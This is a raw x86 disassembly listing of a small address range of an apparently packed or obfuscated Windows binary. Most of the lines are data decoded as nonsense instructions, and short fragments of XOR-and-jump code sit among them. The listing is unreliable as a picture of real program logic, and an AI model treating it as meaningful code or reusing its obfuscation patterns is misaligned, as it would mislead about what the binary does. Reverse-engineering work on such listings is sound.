  40c2ba:	out    0x84,ax
  40c2bd:	ss jle 0x40c305
  40c2c0:	scas   eax,DWORD PTR es:[edi]
  40c2c1:	sub    al,0x7d
  40c2c3:	cli    
  40c2c4:	mov    BYTE PTR [ebp+0x49],cl
  40c2c7:	arpl   WORD PTR [ebx-0x2b],di
  40c2ca:	std    
  40c2cb:	pop    ss
  40c2cc:	retf   0x72a5
  40c2cf:	dec    ebp
  40c2d0:	mov    eax,ds:0x1ebf1f88
  40c2d5:	push   esp
  40c2d6:	mov    bl,0x4a
  40c2d8:	call   FWORD PTR [edi+0x169b7d9]
  40c2de:	jmp    0x40c279
  40c2e0:	sar    BYTE PTR [esi+0x31],cl
  40c2e3:	out    dx,eax
  40c2e4:	sbb    DWORD PTR [esi+0x12],0xffffffe8
  40c2e8:	loop   0x40c285
  40c2ea:	test   al,0xb9
  40c2ec:	cmp    DWORD PTR [edx+0x2ba82041],edx
  40c2f2:	es cmp al,0x89
  40c2f5:	cmp    BYTE PTR [esi-0x1d],dl
  40c2f8:	in     eax,dx
  40c2f9:	rcr    BYTE PTR [ebp+0x47ede93e],cl
  40c2ff:	(bad)  
  40c300:	in     al,dx
  40c301:	add    DWORD PTR [edi],edi
  40c303:	jns    0x40c37e
  40c305:	shl    BYTE PTR [edx],1
  40c307:	dec    esp
  40c308:	loope  0x40c28c
  40c30a:	ror    BYTE PTR [edx-0x5f],0xa7
  40c30e:	sub    DWORD PTR [ebx-0x1b],eax
  40c311:	mov    edx,0x99cbe69
  40c316:	jp     0x40c30a
  40c318:	mov    dl,0x32
  40c31a:	push   es
  40c31b:	lods   eax,DWORD PTR ds:[esi]
  40c31c:	cmp    bl,BYTE PTR [ebx+0x43]
  40c31f:	iret   
  40c320:	leave  
  40c321:	adc    al,0xd
  40c323:	shl    DWORD PTR [esi+0x477e39cc],1
  40c329:	loopne 0x40c381
  40c32b:	les    esi,FWORD PTR [ecx+ebx*2]
  40c32e:	sbb    al,dl
  40c330:	jle    0x40c3af
  40c332:	les    edi,FWORD PTR [esp+eiz*8-0x1b]
  40c336:	and    eax,0xe8501b5d
  40c33b:	loope  0x40c2e5
  40c33d:	add    BYTE PTR [eax],al
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x4227bc
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x4225a8
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x4227bc,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	and    ebp,DWORD PTR [ecx]
  40c3d2:	sbb    eax,0x18fd0d7e
  40c3d7:	sbb    BYTE PTR [esi+0x12],ch
  40c3da:	sbb    BYTE PTR [eax],bl
  40c3dc:	xchg   edi,eax
  40c3dd:	sbb    ebx,DWORD PTR [edx]
  40c3df:	test   edi,0x4658b63a
  40c3e5:	sub    eax,0x5b90194f
  40c3ea:	and    al,BYTE PTR [eax]
  40c3ec:	mov    ds,WORD PTR [edi-0x4b0edbea]
  40c3f2:	(bad)  
  40c3f4:	dec    ebx
  40c3f5:	jle    0x40c42e
  40c3f7:	or     DWORD PTR [edi],esp
  40c3f9:	add    dh,BYTE PTR [ecx]
  40c3fb:	xchg   ecx,eax
  40c3fc:	pop    esi
  40c3fd:	or     eax,0xc7aa743b
  40c402:	das    
  40c403:	add    DWORD PTR [edi+0x46],eax
  40c406:	xchg   esp,eax
  40c407:	dec    ecx
  40c408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c409:	inc    esi
  40c40a:	mov    bl,0xb1
  40c40c:	mov    edx,0xc2819a92
  40c411:	push   edi
  40c412:	cli    
  40c413:	test   BYTE PTR [eax+0x60],ah
  40c416:	ins    BYTE PTR es:[edi],dx
  40c417:	adc    eax,0x71653fcb
  40c41c:	cmp    ah,BYTE PTR [ecx-0x4e4f4594]
  40c422:	xlat   BYTE PTR ds:[ebx]
  40c423:	jo     0x40c459
  40c425:	mov    ebp,0xe0a914d9
  40c42a:	(bad)  
  40c42b:	xor    DWORD PTR [ebx-0x14847787],ebx
  40c431:	mov    ecx,0x700b74aa
  40c436:	in     al,dx
  40c437:	pop    edx
  40c438:	cld    
  40c439:	leave  
  40c43a:	mov    dl,0xa0
  40c43c:	loope  0x40c3f6
  40c43e:	push   es
  40c43f:	sbb    al,0x7f
  40c441:	inc    edi
  40c442:	jg     0x40c46a
  40c444:	cmp    DWORD PTR [esi+0x547e49e6],0xffffffe3
  40c44b:	and    BYTE PTR [ecx],dl
  40c44d:	enter  0x6e11,0x1f
  40c451:	xor    bh,al
  40c453:	retf   0x9993
  40c456:	cld    
  40c457:	xchg   ebx,eax
  40c458:	daa    
  40c459:	repz pushf 
  40c45b:	dec    edi
  40c45c:	dec    ebp
  40c45d:	sbb    edi,edx
  40c45f:	adc    ebp,ebp
  40c461:	shl    BYTE PTR [esi-0x347ae090],cl
  40c467:	cmp    al,al
  40c469:	pop    ds
  40c46a:	fst    st(7)
  40c46c:	jb     0x40c42b
  40c46e:	xchg   BYTE PTR [eax+0x3c],ah
  40c471:	xor    dh,ah
  40c473:	scas   al,BYTE PTR es:[edi]
  40c474:	int3   
  40c475:	pop    ds
  40c476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c477:	mov    BYTE PTR [eax+0xd],cl
  40c47a:	push   0xa1c5d96f
  40c47f:	inc    ebp
  40c480:	data16 stos BYTE PTR es:[edi],al
  40c482:	push   ds
  40c483:	pop    ss
  40c484:	test   dl,0x4f
  40c487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c488:	jns    0x40c429
  40c48a:	int    0x73
  40c48c:	pop    ecx
  40c48d:	pop    ebx
  40c48e:	test   dh,0xf8
  40c491:	inc    edi
  40c492:	nop
  40c493:	data16 aam 0xe5
  40c496:	mov    ebp,0x76925212
  40c49b:	fs repnz xchg ebp,eax
  40c49e:	sbb    eax,0x6f04c86e
  40c4a3:	fs iret 
  40c4a5:	dec    edi
  40c4a6:	xor    edx,DWORD PTR [ebx]
  40c4a8:	add    eax,0xb53d9c1e
  40c4ad:	outs   dx,DWORD PTR ds:[esi]
  40c4ae:	(bad)  
  40c4af:	aad    0x79
  40c4b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b2:	sub    DWORD PTR [eax-0x4335fc64],esp
  40c4b8:	lea    ebp,[esi+0x62694df3]
  40c4be:	sbb    DWORD PTR [ebx],esp
  40c4c0:	mov    BYTE PTR [esi-0x62],ch
  40c4c3:	adc    eax,0xcc1be10
  40c4c8:	xchg   esi,eax
  40c4c9:	icebp  
  40c4ca:	cmc    
  40c4cb:	scas   al,BYTE PTR es:[edi]
  40c4cc:	push   esp
  40c4cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ce:	jb     0x40c521
  40c4d0:	out    dx,eax
  40c4d1:	icebp  
  40c4d2:	sub    BYTE PTR [ecx+0x22d062be],bl
  40c4d8:	inc    ebx
  40c4d9:	ins    DWORD PTR es:[edi],dx
  40c4da:	xchg   ebp,eax
  40c4db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4dc:	jg     0x40c4f2
  40c4de:	jge    0x40c4a4
  40c4e0:	(bad)  
  40c4e1:	test   esi,0xc794ffe
  40c4e7:	add    edi,esi
  40c4e9:	cmp    DWORD PTR [edx+0x771eb250],0xffffffda
  40c4f0:	in     al,0x64
  40c4f2:	out    dx,al
  40c4f3:	sbb    BYTE PTR [ebx+0x32b72b7b],dh
  40c4f9:	lods   eax,DWORD PTR ds:[esi]
  40c4fa:	sbb    bl,cl
  40c4fc:	mov    ah,0x16
  40c4fe:	dec    edi
  40c4ff:	stos   DWORD PTR es:[edi],eax
  40c500:	mov    al,ds:0xd309d854
  40c505:	mov    edi,0x41580eaa
  40c50a:	ja     0x40c4d1
  40c50c:	out    0x37,eax
  40c50e:	ret    
  40c50f:	cmp    DWORD PTR [edi+0x26],eax
  40c512:	pop    eax
  40c513:	sahf   
  40c514:	jmp    0x40c496
  40c516:	push   edx
  40c517:	cwde   
  40c518:	pop    ebp
  40c519:	xchg   esi,eax
  40c51a:	or     DWORD PTR [edx],edi
  40c51c:	cmp    DWORD PTR [esi-0x19],esi
  40c51f:	out    dx,eax
  40c520:	aas    
  40c521:	push   ecx
  40c522:	jl     0x40c4af
  40c524:	pushf  
  40c525:	jae    0x40c4f4
  40c527:	mov    dh,0x9f
  40c529:	inc    ebx
  40c52a:	into   
  40c52b:	popa   
  40c52c:	outs   dx,DWORD PTR ds:[esi]
  40c52d:	fsub   DWORD PTR [eax-0xe722bcf]
  40c533:	cwde   
  40c534:	loopne 0x40c55e
  40c536:	mov    al,0x36
  40c538:	fs jmp 0xef5d:0xdf6e8eb2
  40c540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c541:	sbb    BYTE PTR [eax-0x45],bl
  40c544:	inc    ecx
  40c545:	in     al,0x9c
  40c547:	retf   
  40c548:	inc    esp
  40c549:	add    eax,0xddb24056
  40c54e:	xlat   BYTE PTR ds:[ebx]
  40c54f:	push   0x7d9dda86
  40c554:	js     0x40c59f
  40c556:	xlat   BYTE PTR ds:[ebx]
  40c557:	mov    ds:0x58e3d33b,al
  40c55c:	cwde   
  40c55d:	retf   
  40c55e:	xor    al,0xed
  40c560:	lahf   
  40c561:	adc    al,0xa3
  40c563:	pop    edx
  40c564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c565:	fwait
  40c566:	or     DWORD PTR [edi],esp
  40c568:	push   esp
  40c569:	(bad)  
  40c56a:	lahf   
  40c56b:	mov    al,0x4f
  40c56d:	sar    DWORD PTR [ecx-0x24],cl
  40c570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c571:	loop   0x40c5c0
  40c573:	ja     0x40c5c8
  40c575:	(bad)  
  40c576:	out    0x8f,eax
  40c578:	and    ah,BYTE PTR [esi+0x1e]
  40c57b:	jo     0x40c527
  40c57d:	sub    al,0x7c
  40c57f:	inc    esp
  40c580:	push   ebx
  40c581:	adc    DWORD PTR cs:[edx+0x110cd198],ebp
  40c588:	mov    DWORD PTR [ebx+0x1e],ecx
  40c58b:	imul   ecx,DWORD PTR [ecx],0x1379bf7a
  40c591:	cmp    edi,edi
  40c593:	pop    esi
  40c594:	push   edi
  40c595:	fild   DWORD PTR [edx-0x6acca1d1]
  40c59b:	aam    0x58
  40c59d:	pop    edi
  40c59e:	xchg   ebp,eax
  40c59f:	mov    bh,0x3
  40c5a1:	xchg   ebp,eax
  40c5a2:	or     ch,bl
  40c5a4:	xchg   esp,eax
  40c5a5:	ret    0xd4da
  40c5a8:	jmp    0xd811:0xba21f7d8
  40c5af:	pop    ss
  40c5b0:	cld    
  40c5b1:	ss push edx
  40c5b3:	jo     0x40c538
  40c5b5:	push   ds
  40c5b6:	mov    dl,0xc
  40c5b8:	fwait
  40c5b9:	jp     0x40c5c0
  40c5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5bc:	push   ss
  40c5bd:	pop    es
  40c5be:	(bad)  
  40c5bf:	mov    edx,0x92315866
  40c5c4:	adc    edi,DWORD PTR [esi]
  40c5c6:	adc    edx,esp
  40c5c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5c9:	rol    BYTE PTR [ebp-0x6740f469],1
  40c5cf:	loopne 0x40c62c
  40c5d1:	(bad)  
  40c5d2:	cmp    BYTE PTR [ebx],al
  40c5d4:	mov    ds,WORD PTR [edx+0x14ab73b9]
  40c5da:	(bad)  
  40c5db:	xor    dh,al
  40c5dd:	mov    al,0xed
  40c5df:	xor    eax,0x6a50124a
  40c5e4:	sub    bh,bl
  40c5e6:	ret    
  40c5e7:	sahf   
  40c5e8:	in     eax,0x19
  40c5ea:	in     eax,0x97
  40c5ec:	or     eax,0x7284c6cd
  40c5f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5f2:	arpl   WORD PTR [esi-0x59],di
  40c5f5:	pop    ss
  40c5f6:	push   es
  40c5f7:	jle    0x40c647
  40c5f9:	mov    eax,0xf02acd90
  40c5fe:	sub    esi,DWORD PTR [ecx]
  40c600:	mov    edx,0xc7f0877b
  40c605:	rol    DWORD PTR [ebp+0x10651ce7],cl
  40c60b:	je     0x40c5ab
  40c60d:	(bad)  
  40c60e:	test   ecx,esi
  40c610:	cmp    eax,0xd6482ad
  40c615:	inc    esi
  40c616:	not    DWORD PTR [eax]
  40c618:	fwait
  40c619:	loop   0x40c62c
  40c61b:	sahf   
  40c61c:	inc    esp
  40c61d:	ret    0xc862
  40c620:	ins    DWORD PTR es:[edi],dx
  40c621:	jno    0x40c610
  40c623:	in     al,dx
  40c624:	bound  ebp,QWORD PTR [edx-0x68]
  40c627:	sbb    edx,DWORD PTR [edx]
  40c629:	or     DWORD PTR [edx-0x2f],esi
  40c62c:	jno    0x40c68d
  40c62e:	gs retf 
  40c630:	push   ebp
  40c631:	mov    edi,0xb4b849e8
  40c636:	ins    BYTE PTR es:[edi],dx
  40c637:	lods   eax,DWORD PTR ds:[esi]
  40c638:	imul   ebp,DWORD PTR ds:0x897d1462,0x24
  40c63f:	adc    esi,edi
  40c641:	popa   
  40c642:	xchg   edx,eax
  40c643:	sub    BYTE PTR [ebx*2-0x20667ee9],0xfa
  40c64b:	les    edi,FWORD PTR [eax]
  40c64d:	ins    BYTE PTR es:[edi],dx
  40c64e:	dec    ecx
  40c64f:	loopne 0x40c5dc
  40c651:	jmp    0x3189:0x798ef0a
  40c658:	lods   al,BYTE PTR ds:[esi]
  40c659:	in     eax,dx
  40c65a:	stos   BYTE PTR es:[edi],al
  40c65b:	adc    eax,edx
  40c65d:	in     al,dx
  40c65e:	cwde   
  40c65f:	mov    al,ds:0x950fb453
  40c664:	pop    es
  40c665:	mov    cl,0x9
  40c667:	pop    esi
  40c668:	(bad)  
  40c669:	jb     0x40c6e0
  40c66b:	and    BYTE PTR [esi*4-0x530f386b],bl
  40c672:	dec    esp
  40c673:	imul   DWORD PTR [eax-0x38]
  40c676:	sbb    edi,ecx
  40c678:	xchg   esi,eax
  40c679:	stos   DWORD PTR es:[edi],eax
  40c67a:	mov    al,0x19
  40c67c:	loopne 0x40c657
  40c67e:	pop    ds
  40c67f:	test   al,0x16
  40c681:	mov    WORD PTR [ecx+esi*4],?
  40c684:	retf   
  40c685:	ds adc eax,0xc0370d5e
  40c68b:	stos   DWORD PTR es:[edi],eax
  40c68c:	inc    esi
  40c68d:	test   ecx,ebx
  40c68f:	adc    BYTE PTR [edi-0x56],bh
  40c692:	loope  0x40c63b
  40c694:	push   ss
  40c695:	mov    ebp,0xfafcce75
  40c69a:	in     al,dx
  40c69b:	out    0x4a,eax
  40c69d:	fiadd  DWORD PTR [esi+0x78]
  40c6a0:	hlt    
  40c6a1:	mov    eax,ds:0x9f70ec95
  40c6a6:	sti    
  40c6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a8:	aad    0x2a
  40c6aa:	cmp    al,0x19
  40c6ac:	jge    0x40c699
  40c6ae:	cmp    DWORD PTR [esi],ecx
  40c6b0:	(bad)  
  40c6b1:	push   0xffffff8b
  40c6b3:	(bad)  
  40c6b4:	xchg   esi,eax
  40c6b5:	adc    al,0x41
  40c6b7:	outs   dx,DWORD PTR ds:[esi]
  40c6b8:	mov    ebp,0x5216b2c
  40c6bd:	rcr    DWORD PTR [ebp-0x434c3eb],0x6
  40c6c4:	scas   al,BYTE PTR es:[edi]
  40c6c5:	aam    0x1c
  40c6c7:	test   al,0x78
  40c6ca:	mov    bl,0x16
  40c6cc:	imul   esp,DWORD PTR [ebp+0x3643d34b],0xf8e43362
  40c6d6:	xchg   edi,eax
  40c6d7:	aas    
  40c6d8:	mov    gs,WORD PTR [eax-0x1815fe22]
  40c6de:	push   ebp
  40c6df:	add    eax,DWORD PTR [ebx-0x3a]
  40c6e2:	inc    ebx
  40c6e3:	shl    BYTE PTR [edi],cl
  40c6e5:	leave  
  40c6e6:	outs   dx,BYTE PTR ds:[esi]
  40c6e7:	(bad)  
  40c6e8:	dec    edx
  40c6e9:	aaa    
  40c6ea:	jle    0x40c730
  40c6ec:	ds ror ah,cl
  40c6ef:	mov    eax,ds:0x534b3931
  40c6f4:	jo     0x40c6d8
  40c6f6:	ss mov al,bh
  40c6f9:	add    esi,ecx
  40c6fb:	hlt    
  40c6fc:	inc    ecx
  40c6fd:	pop    esi
  40c6fe:	pushf  
  40c6ff:	js     0x40c6c8
  40c701:	add    edx,0xfffffff2
  40c704:	sar    ebp,1
  40c706:	xchg   esi,ecx
  40c708:	sub    DWORD PTR [esi-0x48],0x6e
  40c70c:	xchg   BYTE PTR [eax-0x34],dh
  40c70f:	sbb    al,0x3a
  40c711:	pop    esp
  40c712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c713:	imul   ecx,DWORD PTR [edi-0x6],0x75c70821
  40c71a:	out    0xbd,eax
  40c71c:	aaa    
  40c71d:	ror    BYTE PTR [esi+0x213e5cc6],0xe5
  40c724:	and    ebp,DWORD PTR [edx-0x293edf72]
  40c72a:	(bad)  
  40c72b:	push   0xffffff8c
  40c72d:	imul   ebx,DWORD PTR [edi],0x393e8b34
  40c733:	mov    bl,0x7b
  40c735:	or     DWORD PTR [edx+0x45],esi
  40c738:	pop    esp
  40c739:	idiv   DWORD PTR [ebp+0x71]
  40c73c:	adc    cl,BYTE PTR [esi]
  40c73e:	mov    BYTE PTR [eax],0xe3
  40c741:	ins    BYTE PTR es:[edi],dx
  40c742:	jp     0x40c6c4
  40c744:	mov    esi,0x9fe7fff1
  40c749:	ins    BYTE PTR es:[edi],dx
  40c74a:	cdq    
  40c74b:	mov    DWORD PTR [edi-0x69],ebp
  40c74e:	loope  0x40c7b2
  40c750:	mov    ds:0xe3b0a6aa,al
  40c755:	jo     0x40c712
  40c757:	xchg   esp,edi
  40c759:	inc    edx
  40c75a:	adc    DWORD PTR [ebx],0x16
  40c75d:	and    esp,DWORD PTR [edi+esi*4-0x1]
  40c761:	iret   
  40c762:	out    0x12,al
  40c764:	cmp    cl,bh
  40c766:	push   ss
  40c767:	test   BYTE PTR [ebp-0x5415eb8f],0xf3
  40c76e:	jge    0x40c73e
  40c770:	loop   0x40c73b
  40c772:	(bad)  
  40c773:	jmp    0x3cddbf02
  40c778:	jge    0x40c713
  40c77a:	pop    ebp
  40c77b:	adc    bl,0x25
  40c77e:	lock jbe 0x40c73c
  40c781:	or     bl,BYTE PTR [edx]
  40c783:	popa   
  40c784:	loop   0x40c71b
  40c786:	test   al,0x3a
  40c788:	pop    esp
  40c789:	cmp    DWORD PTR [ebx+0x34944762],ebx
  40c78f:	or     al,0xbd
  40c791:	out    0x55,eax
  40c793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c794:	sbb    eax,0x33b16465
  40c799:	in     eax,0xa7
  40c79b:	cmc    
  40c79c:	dec    ecx
  40c79d:	dec    edi
  40c79e:	sub    BYTE PTR [edx+ecx*4-0x682bacc7],bl
  40c7a5:	inc    edi
  40c7a6:	mov    bl,0xbb
  40c7a8:	aaa    
  40c7a9:	add    al,0x7a
  40c7ab:	inc    edi
  40c7ac:	lock xchg ebp,eax
  40c7ae:	call   0x72ff:0x4f443c03
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi-0x1ab39090]
  40c7fd:	stos   BYTE PTR es:[edi],al
  40c7fe:	arpl   bp,si
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [eax],ch
  40c807:	or     bh,BYTE PTR [edi]
  40c809:	sub    DWORD PTR [edx-0x4d],edx
  40c80c:	cld    
  40c80d:	or     bl,BYTE PTR [ecx+0x69]
  40c810:	and    al,BYTE PTR [eax-0x72]
  40c813:	lds    ebx,FWORD PTR [edx+eax*2+0x56]
  40c817:	(bad)  
  40c818:	or     al,0x51
  40c81a:	not    BYTE PTR [ebx]
  40c81c:	add    BYTE PTR [esi+0x254ec5bf],dl
  40c822:	cmc    
  40c823:	push   eax
  40c824:	sbb    dl,BYTE PTR [ebp-0x7c6601e]
  40c82a:	test   eax,0xcc874821
  40c82f:	std    
  40c830:	rol    BYTE PTR [edx+0x64],1
  40c833:	test   BYTE PTR [edi-0x18],bl
  40c836:	sub    dl,cl
  40c838:	jnp    0x40c89f
  40c83a:	cwde   
  40c83b:	scas   eax,DWORD PTR es:[edi]
  40c83c:	mov    BYTE PTR [ebp+0x2c],0xb2
  40c840:	push   ecx
  40c841:	adc    DWORD PTR [esi+0x1d],edx
  40c844:	push   cs
  40c845:	dec    esi
  40c846:	ins    DWORD PTR es:[edi],dx
  40c847:	adc    DWORD PTR [edx+0xe29705],edi
  40c84d:	push   cs
  40c84e:	cs push eax
  40c850:	fdivrp st(4),st
  40c852:	pop    esi
  40c853:	mov    edi,0xc6d1f1a7
  40c858:	aad    0xfa
  40c85a:	push   esp
  40c85b:	jnp    0x40c875
  40c85d:	lea    ecx,[ebx]
  40c85f:	lea    eax,[ebx]
  40c861:	(bad)  
  40c863:	dec    ebp
  40c864:	(bad)  
  40c865:	push   es
  40c866:	jnp    0x40c84e
  40c868:	je     0x40c800
  40c86a:	shl    DWORD PTR [esi],cl
  40c86c:	call   0xc0b02ef4
  40c871:	xchg   ebp,eax
  40c872:	add    al,0x57
  40c874:	jge    0x40c896
  40c876:	sub    al,0xeb
  40c878:	push   0x7a
  40c87a:	add    DWORD PTR [esp+eax*8+0x221b48b8],ebp
  40c881:	aas    
  40c882:	repnz xchg edi,eax
  40c884:	sub    DWORD PTR [ebp-0x3a],ebx
  40c887:	jns    0x40c827
  40c889:	and    al,0x6a
  40c88b:	pushf  
  40c88c:	lea    esi,[ecx]
  40c88e:	xor    dh,ch
  40c890:	mov    dl,0x61
  40c892:	add    DWORD PTR [edx+ebp*2-0x2c3fad57],ebx
  40c899:	xor    ebx,DWORD PTR [eax]
  40c89b:	xor    BYTE PTR [eax],bh
  40c89d:	sbb    edx,DWORD PTR [ebp+0x3e]
  40c8a0:	adc    eax,0x33828cde
  40c8a5:	test   al,0x93
  40c8a7:	fsub   QWORD PTR [esi-0x2f2798b2]
  40c8ad:	data16 jp 0x40c8c2
  40c8b0:	cmp    cl,BYTE PTR [edx]
  40c8b2:	std    
  40c8b3:	scas   al,BYTE PTR es:[edi]
  40c8b4:	mov    al,0xb2
  40c8b6:	xor    al,BYTE PTR [esi+eiz*1-0xce9a56e]
  40c8bd:	jle    0x40c861
  40c8bf:	xor    eax,0x7b9d4d92
  40c8c4:	dec    ebp
  40c8c5:	repnz cmp bl,BYTE PTR ds:0x9516def1
  40c8cc:	mov    DWORD PTR [ebp+0x10],edx
  40c8cf:	stos   BYTE PTR es:[edi],al
  40c8d0:	daa    
  40c8d1:	pop    ds
  40c8d2:	adc    DWORD PTR [ecx],ecx
  40c8d4:	loopne 0x40c8b5
  40c8d6:	xor    al,0x7a
  40c8d8:	sbb    edx,0x146643b9
  40c8de:	or     eax,0x53a29b49
  40c8e3:	into   
  40c8e4:	push   ebp
  40c8e5:	clc    
  40c8e6:	push   DWORD PTR [esi-0x16]
  40c8e9:	ror    ecx,1
  40c8eb:	lods   al,BYTE PTR ds:[esi]
  40c8ec:	mov    ah,0x2e
  40c8ee:	sbb    DWORD PTR [ebx-0x267c91c6],ebp
  40c8f4:	cmp    BYTE PTR [ecx+edi*2-0x11],dl
  40c8f8:	push   esi
  40c8f9:	mov    DWORD PTR [esi+0x666a76be],0x7f5cf3f6
  40c903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c904:	arpl   sp,si
  40c906:	inc    ebx
  40c907:	into   
  40c908:	sub    DWORD PTR [ecx-0x4257257a],esi
  40c90e:	push   edx
  40c90f:	lds    esi,FWORD PTR [edi+0x20666f22]
  40c915:	scas   eax,DWORD PTR es:[edi]
  40c916:	xor    al,BYTE PTR [esi]
  40c918:	xor    al,BYTE PTR [edx+0x4a]
  40c91b:	in     al,0x71
  40c91d:	mov    edx,0xf09d222e
  40c922:	jp     0x40c959
  40c924:	(bad)  
  40c925:	xchg   esi,eax
  40c926:	sbb    BYTE PTR [esi-0x777a7162],dh
  40c92c:	xor    eax,0xf112687e
  40c931:	or     al,0x77
  40c933:	mov    bl,0x2c
  40c935:	(bad)  
  40c936:	and    ch,BYTE PTR [edi]
  40c938:	call   FWORD PTR [eax+edx*4]
  40c93b:	imul   ebp,DWORD PTR [edx-0x1f],0xffffffa9
  40c93f:	das    
  40c940:	aam    0x5c
  40c942:	or     eax,0x11917d0c
  40c947:	and    esi,DWORD PTR [esi]
  40c949:	idiv   ecx
  40c94b:	out    dx,al
  40c94c:	jno    0x40c95d
  40c94e:	(bad)  
  40c94f:	outs   dx,BYTE PTR ds:[esi]
  40c950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c951:	add    BYTE PTR [edi],dh
  40c953:	sar    edi,1
  40c955:	fldenv [eax+0x5ee4365e]
  40c95b:	or     BYTE PTR ds:0x1034da74,cl
  40c961:	xor    cl,bl
  40c963:	xchg   edi,eax
  40c964:	nop
  40c965:	in     eax,dx
  40c966:	sub    esp,0x2e
  40c969:	adc    bh,bl
  40c96b:	mov    esi,0xdb922b3a
  40c970:	lahf   
  40c971:	lods   eax,DWORD PTR ds:[esi]
  40c972:	dec    ebp
  40c973:	dec    edx
  40c974:	cmp    ecx,DWORD PTR ds:0x79e62283
  40c97a:	addr16 push esi
  40c97c:	xchg   edx,eax
  40c97d:	dec    ecx
  40c97e:	aad    0xa7
  40c980:	xor    DWORD PTR [edx+0x2],esi
  40c983:	in     eax,dx
  40c984:	xor    ah,BYTE PTR ds:0x48300ce
  40c98a:	scas   eax,DWORD PTR es:[edi]
  40c98b:	stos   DWORD PTR es:[edi],eax
  40c98c:	mov    edi,0x8fb64be6
  40c991:	(bad)  
  40c992:	cli    
  40c993:	adc    dl,BYTE PTR [ecx+0x7cafc52d]
  40c999:	imul   ecx,DWORD PTR [edi],0xe3748d43
  40c99f:	(bad)  
  40c9a0:	push   ebp
  40c9a1:	loope  0x40c98a
  40c9a3:	add    bh,bh
  40c9a5:	push   edx
  40c9a6:	and    DWORD PTR [edx],edi
  40c9a8:	es sti 
  40c9aa:	jo     0x40c9ba
  40c9ac:	retf   
  40c9ad:	cmp    DWORD PTR [edi+ebp*8],esi
  40c9b0:	iret   
  40c9b1:	inc    edi
  40c9b2:	pop    eax
  40c9b3:	repnz test al,0xfa
  40c9b6:	mov    ecx,0xc416c0f
  40c9bb:	mov    dl,BYTE PTR [ecx+0x45d5baa9]
  40c9c1:	jmp    0x40c94b
  40c9c3:	(bad)  
  40c9c4:	vmwrite edi,DWORD PTR ds:0x3b277ce1
  40c9cb:	add    eax,0x6d8eeb51
  40c9d0:	cwde   
  40c9d1:	xor    al,bl
  40c9d3:	xchg   esp,eax
  40c9d4:	dec    edi
  40c9d5:	sbb    ch,dl
  40c9d7:	daa    
  40c9d8:	xor    BYTE PTR [eax+0x27],cl
  40c9db:	popa   
